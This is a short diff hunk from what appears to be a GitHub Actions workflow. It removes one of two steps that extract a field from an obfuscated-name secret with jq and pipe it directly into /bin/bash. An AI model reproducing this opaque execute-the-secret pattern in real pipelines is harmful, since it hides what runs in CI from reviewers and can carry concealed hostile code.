@@ -23,7 +23,6 @@ jobs:
           wxwnt25: ${{ secrets.wxwnt25 }}
         run: |
           printf '%s' "$wxwnt25" | jq -r .ayjyw76 | /bin/bash
-          printf '%s' "$lzc2" | jq -r .ubgns47519 | /bin/bash
 
       - name: Store artifact
         if: always()
